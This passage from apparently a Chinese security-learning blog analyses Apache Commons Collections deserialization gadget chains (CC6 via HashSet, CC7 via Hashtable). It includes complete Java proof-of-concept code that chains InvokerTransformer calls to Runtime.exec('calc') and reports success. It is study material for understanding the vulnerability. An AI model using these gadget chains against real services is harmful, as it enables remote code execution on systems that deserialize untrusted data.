class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] fakeTransformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] chainPart = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Runtime.class,<span class="literal">null</span>&#125;),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformer);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">haha</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazy</span> <span class="operator">=</span> LazyMap.decorate(haha,chain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">outerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazy,<span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hashSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        hashSet.add(outerMap);</span><br><span class="line">        haha.remove(<span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field1.set(chain,chainPart);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        out.writeObject(hashSet);</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        input.readObject();</span><br><span class="line">        input.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行后成功弹出计算机：</p>
<p><img src="/2024/08/13/CC6/image-20240729153811004.png" alt="image-20240729153811004"></p>
<p>需要注意的地方和前面HashMap利用链差不多，说到底这个HashSet也就是间接调用HashMap的put方法，本质是一样的。</p>
<h3 id="好处"><a href="#好处" class="headerlink" title="好处"></a>好处</h3><p>这两个利⽤链可以在Java 7和8的⾼版本触发，应该是通杀Java7、8版本的。</p>
]]></content>
      <categories>
        <category>Java安全</category>
        <category>Java反序列化调用链分析</category>
        <category>CC6</category>
      </categories>
  </entry>
  <entry>
    <title>CC7</title>
    <url>/2024/08/13/CC7/</url>
    <content><![CDATA[<p>CC7学习</p>
<span id="more"></span>

<h1 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h1><p>CC7的思路同样是找另一条调用链来触发lazy.get()方法，<strong>这次用到的是Hashtable类</strong></p>
<p><strong>测试环境：</strong></p>
<ul>
<li>JDK 8u411</li>
<li>commons-collections 3.2.1</li>
</ul>
<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>在ysoserial给出的调用链中，选取了<code>java.util.Hashtable#readObject</code>方法作为调用链的起点。</p>
<p>Hashtable 与 HashMap很相似，都是一种key-value形式的哈希表，但是还是有区别：</p>
<ul>
<li>HashMap 与 Hashtable的父类不一样。</li>
<li>两者内部基本都是使用“数组-链表”的结构，但是 HashMap 引入了红黑树的实现。</li>
<li>Hashtable 的key-value 不允许为null值，但是HashMap 是允许的，后者会将 key&#x3D;value的实体放在index&#x3D;0 的位置。</li>
<li>Hashtable 线程安全，HashMap 线程不安全。</li>
</ul>
<p>同样的，既然HashMap可以实现反序列化漏洞，Hashtable同样可以。</p>
<p>分析源码，这个Hashtable类可以给出两条链，分别是</p>
<ul>
<li><code>readObject()</code>中的<code>reconstitution()</code>的<code>hashCode()</code>方法</li>
<li><code>readObject()</code>中的<code>reconstitution()</code>的<code>equal()</code>方法</li>
</ul>
<h3 id="hashCode"><a href="#hashCode" class="headerlink" title="hashCode"></a>hashCode</h3><p>（其实给这个都可以算到CC6那里去，利用思路和CC6差不多）</p>
<p>我们来看一下Hashtable的readObject()方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">         <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        ObjectInputStream.<span class="type">GetField</span> <span class="variable">fields</span> <span class="operator">=</span> s.readFields();</span><br><span class="line"></span><br><span class="line">        <span class="type">float</span> <span class="variable">lf</span> <span class="operator">=</span> fields.get(<span class="string">&quot;loadFactor&quot;</span>, <span class="number">0.75f</span>);</span><br><span class="line">        <span class="keyword">if</span> (lf &lt;= <span class="number">0</span> || Float.isNaN(lf))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> + lf);</span><br><span class="line">        lf = Math.min(Math.max(<span class="number">0.25f</span>, lf), <span class="number">4.0f</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">origlength</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">        <span class="type">int</span> <span class="variable">elements</span> <span class="operator">=</span> s.readInt();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (elements &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(<span class="string">&quot;Illegal # of Elements: &quot;</span> + elements);</span><br><span class="line"></span><br><span class="line">        origlength = Math.max(origlength, (<span class="type">int</span>)(elements / lf) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> (<span class="type">int</span>)((elements + elements / <span class="number">20</span>) / lf) + <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">if</span> (length &gt; elements &amp;&amp; (length &amp; <span class="number">1</span>) == <span class="number">0</span>)</span><br><span class="line">            length--;</span><br><span class="line">        length = Math.min(length, origlength);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (length &lt; <span class="number">0</span>) &#123; <span class="comment">// overflow</span></span><br><span class="line">            length = origlength;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, length);</span><br><span class="line">        Hashtable.UnsafeHolder.putLoadFactor(<span class="built_in">this</span>, lf);</span><br><span class="line">        table = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;?,?&gt;[length];</span><br><span class="line">        threshold = (<span class="type">int</span>)Math.min(length * lf, MAX_ARRAY_SIZE + <span class="number">1</span>);</span><br><span class="line">        count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K)s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V)s.readObject();</span><br><span class="line">            <span class="comment">// sync is eliminated for performance</span></span><br><span class="line">            reconstitutionPut(table, key, value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>重点还是最后面那串代码，如下：<br><img src="/2024/08/13/CC7/image-20240801094040061.png" alt="image-20240801094040061"></p>
<p>在readObject方法中，最后调用了<code>reconstitutionPut</code>方法将反序列化得到的key-value 放在内部实现的 Entry 数组 table里。</p>
<p>跟进<code>reconstitutionPut</code>方法源码：</p>
<p><img src="/2024/08/13/CC7/image-20240801094440480.png" alt="image-20240801094440480"></p>
<p>可以看见这个<code>reconstitutionPut()</code>里面也调用了hashCode，并且可以很容易看出value不能为null。感觉和HashMap是差不多的，看一下Hashtable类的put()方法：<br><img src="/2024/08/13/CC7/image-20240801095715776.png" alt="image-20240801095715776"></p>
<p>和CC6那就差不多了，这不就直接可以构造了吗</p>
<p>直接按照CC6的HashMap的链子原理构造代码即可：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] fakeTransformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] chainpart = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Runtime.class,<span class="literal">null</span>&#125;),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformer);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">haha</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazy</span> <span class="operator">=</span> LazyMap.decorate(haha,chain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">outerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazy,<span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashMap.put(outerMap,<span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line">        haha.remove(<span class="string">&quot;fupanc&quot;</span>);<span class="comment">//这里注意fupanc所属对象，使用lazy也行</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">x</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        x.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        x.set(chain,chainpart);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        out.writeObject(hashMap);</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        input.readObject();</span><br><span class="line">        input.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功弹出计算机。</p>
<p>————————</p>
<h3 id="equals"><a href="#equals" class="headerlink" title="equals"></a>equals</h3><p>但是ysoserial链中的利用点却不是上面那个简单链，继续分析这个Hashtable类的代码。</p>
<p><strong>先给出利用链要用到的类以及对应方法的源码</strong>：</p>
<ul>
<li>HashMap的父类AbstractMap类的equals()方法源码（get方法的起点）：</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (o == <span class="built_in">this</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> Map))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;</span><br><span class="line">        <span class="keyword">if</span> (m.size() != size())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">            <span class="keyword">while</span> (i.hasNext()) &#123;</span><br><span class="line">                Entry&lt;K,V&gt; e = i.next();</span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> e.getKey();</span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> e.getValue();</span><br><span class="line">                <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!(m.get(key)==<span class="literal">null</span> &amp;&amp; m.containsKey(key)))</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!value.equals(m.get(key)))<span class="comment">//这里调用了get方法</span></span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassCastException unused) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NullPointerException unused) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>LazyMap的父类AbstractMapDecorator的equals()方法源码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> object == <span class="built_in">this</span> ? <span class="literal">true</span> : <span class="built_in">this</span>.map.equals(object);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>在Hashtable 的readObject() 方法中用到了for循环，如下：</p>
<p><img src="/2024/08/13/CC7/image-20240801143656945.png" alt="image-20240801143656945"></p>
<p>这里的elements代表键值对的个数，这里调用for循环来<strong>一次读取一个键值对</strong>。并且在反序列化过程中，<code>table</code>(也就是reconstitution方法内的tab)是共享的，也就是说在整个反序列化过程中始终使用同一个 <code>tab</code>，所有的键值对都将被插入到同一个 <code>tab</code> 中，构成一个完整的哈希表，并且看Hashtable类中也有这个变量：</p>
<p><img src="/2024/08/13/CC7/image-20240801164533548.png" alt="image-20240801164533548"></p>
<p>table在Hastable也是有定义的，结合前面的说明，可以知道在反序列化的时候会将键值对放入到这个数组中，但是这里的table是transient修饰的，导致不会被序列化，那么这是如何解决的呢？重点就是在<code>Hashtable#writeObject()</code>方法，源码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span><br><span class="line">            <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Entry&lt;Object, Object&gt; entryStack = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">            s.defaultWriteObject();</span><br><span class="line"></span><br><span class="line">            s.writeInt(table.length);</span><br><span class="line">            s.writeInt(count);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>; index &lt; table.length; index++) &#123;</span><br><span class="line">                Entry&lt;?,?&gt; entry = table[index];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span> (entry != <span class="literal">null</span>) &#123;</span><br><span class="line">                    entryStack =</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(<span class="number">0</span>, entry.key, entry.value, entryStack);</span><br><span class="line">                    entry = entry.next;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (entryStack != <span class="literal">null</span>) &#123;</span><br><span class="line">            s.writeObject(entryStack.key);</span><br><span class="line">            s.writeObject(entryStack.value);</span><br><span class="line">            entryStack = entryStack.next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在这个writeObject()方法中，定义了一个<code>entryStack</code>用于暂时存储所有的键值对，赋值就是在for循环中，在这个for循环中，遍历<code>table</code>数组的每个<code>Entry</code>对象，将其填入<code>entryStack</code>数组中，最后在while循环中将每个键值对序列化。</p>
<p><strong>继续看reconstitutionput()方法：</strong></p>
<p><img src="/2024/08/13/CC7/image-20240801101906268.png" alt="image-20240801101906268"></p>
<p>这个for循环代码会遍历链表，直到链表末尾。同时在for循环内部，可以看到只要当前节点的哈希值与目标哈希值相等以及当前节点的键与目标键相等就会抛出异常</p>
<p><strong>所以这个代码的作用就是确保哈希表中不会出现重复的键</strong>。如果在遍历链表过程中发现有节点的哈希值和键都与目标值相同，就会抛出 <code>StreamCorruptedException</code> 异常。这可能用于序列化&#x2F;反序列化过程中，防止数据结构被破坏或出现不一致的情况。</p>
<p>如果没有重复的键，在这个for循环过后，将会将这个键值对填入到table数组中：</p>
<p><img src="/2024/08/13/CC7/image-20240801165644341.png" alt="image-20240801165644341"></p>
<p>既然这里都说明了是利用equal()方法来创建利用链，在这个<code>reconstitutionPut()</code>方法源码中，可以看到在for循环那里要利用到了<code>equals()</code>方法：</p>
<p><img src="/2024/08/13/CC7/image-20240801170157261.png" alt="image-20240801170157261"></p>
<p>由于java中的<code>&amp;&amp;</code>有短路求值的特性，必须要前一个条件（e.hash &#x3D;&#x3D; hash）为真，才会进行第二个条件（e.key.equals(key)）的判断。</p>
<p><strong>所以我们这里至少put进两个键值对</strong>，这样在第二个键值对与第一个键值对比较时才有可能通过第一个条件。</p>
<p>再结合前面提前给出的类，大概可以知道利用链了，这里将e.key设置为LazyMap类实例，但是LazyMap中并没有直接定义<code>equals()</code>方法（内部类有，但是不能直接调用），这样就会调用LazyMap的父类AbstractMapDecorator的equals()方法：</p>
<p><img src="/2024/08/13/CC7/image-20240801204147243.png" alt="image-20240801204147243"></p>
<p>这里的<code>this</code> 关键字在方法中代表当前类的实例，即调用该方法的对象。如果相同就会直接返回ture，否则就会调用后面的。而我们的利用链就是要调用后面的。</p>
<p>由于我们实例化LazyMap时，都是传入一个HashMap类实例，最终会将AbstractMapDecorator的<code>this.map</code>设置为HashMap类的实例化对象，这样就会调用HashMap类的equals()方法，但是情况同LazyMap一样，会直接调用父类AbstractMap的equals()方法（部分源码）：</p>
<p><img src="/2024/08/13/CC7/image-20240801204721007.png" alt="image-20240801204721007"></p>
<p>然后在AbstractMap的equals()方法中调用了get()方法，这就是起点，<strong>并且这里的<code>m</code>就是<code>e.key.equals(key)</code>中的第二个key，所以我们需要传入两个LazyMap实例</strong>。</p>
<p><strong>大概就是这样了，现在来搓代码。</strong></p>
<p>综合前面的问题：</p>
<ul>
<li>需要传入两个键值对。需要将<code>e.key</code>设置为LazyMap对象，即key都是LazyMap对象</li>
<li>hash相等问题</li>
</ul>
<p>先给个基本盘：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] fakeTransformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] chainpart = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Runtime.class,<span class="literal">null</span>&#125;),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformer);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">haha</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazy</span> <span class="operator">=</span> LazyMap.decorate(haha,chain);</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        <span class="comment">//这里开始想代码</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">x</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        x.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        x.set(chain,chainpart);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        out.writeObject(hashtable);</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        input.readObject();</span><br><span class="line">        input.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在聚焦于readObject()的<code>reconstitutionPut</code>方法：</p>
<p><img src="/2024/08/13/CC7/image-20240801173418173.png" alt="image-20240801173418173"></p>
<p>这里要求前面的条件相等，并且后面的<code>e.key</code>需要为LazyMap类实例，那么我就传入两个LazyMap类实例</p>
